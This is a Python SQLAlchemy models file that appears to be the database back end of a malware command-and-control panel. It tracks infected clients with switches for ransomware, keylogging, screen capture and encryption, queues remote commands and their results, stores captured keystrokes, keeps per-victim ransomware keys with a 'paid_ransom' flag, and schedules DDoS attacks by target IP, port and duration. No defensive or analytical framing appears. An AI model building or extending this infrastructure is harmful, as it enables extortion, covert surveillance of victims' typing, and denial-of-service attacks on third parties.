from sqlalchemy import Column, Integer, String, DateTime, Boolean, ForeignKey, Text
from sqlalchemy.orm import relationship
from database import Base
from datetime import datetime

def get_current_time():
   
    now = datetime.utcnow()
    return now.replace(microsecond=0)

class Client(Base):

    __tablename__ = 'clients'

    id = Column(Integer, primary_key=True, index=True)
    client_id = Column(String, unique=True, index=True)
    ip_address = Column(String)
    last_seen = Column(DateTime, default=get_current_time)
    is_active = Column(Boolean, default=True)
    operating_system = Column(String)

    ransomware = Column(Boolean, default=False)
    keylogger = Column(Boolean, default=True)
    screencapture = Column(Boolean, default=True)
    cifrado = Column(Boolean, default=False)

    keystroke_logs = relationship("KeystrokeLog", back_populates="client")
    ransomware_data = relationship("RansomwareData", back_populates="client", uselist=False)
    
class Command(Base):

    __tablename__ = 'commands'

    id = Column(Integer, primary_key=True, index=True)
    client_id = Column(Integer, ForeignKey('clients.id'))
    command = Column(String)
    execution = Column(Boolean, default=False)
    execution_time = Column(DateTime, default=get_current_time)
    result = Column(Text) 
    executed = Column(Boolean, default=False)


class Admin(Base):

    __tablename__ = 'admins'

    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, index=True)
    password = Column(String)


class KeystrokeLog(Base):
    __tablename__ = 'keystroke_logs'

    id = Column(Integer, primary_key=True, index=True)
    client_id = Column(Integer, ForeignKey('clients.id'))
    timestamp = Column(DateTime, default=datetime.utcnow)
    text = Column(Text)

    client = relationship("Client", back_populates="keystroke_logs")
    client_id = Column(Integer, ForeignKey('clients.id'))


class RansomwareData(Base):
    __tablename__ = 'ransomware_data'

    id = Column(Integer, primary_key=True, index=True)
    client_id = Column(Integer, ForeignKey('clients.id'), unique=True)
    key = Column(String)
    iv = Column(String)
    paid_ransom = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    client = relationship("Client", back_populates="ransomware_data")

class DDoSAttack(Base):
    __tablename__ = 'ddos_attacks'

    id = Column(Integer, primary_key=True, index=True)
    ip = Column(String)
    port = Column(Integer)
    threads = Column(Integer)
    duration = Column(Integer)
    scheduled_time = Column(String)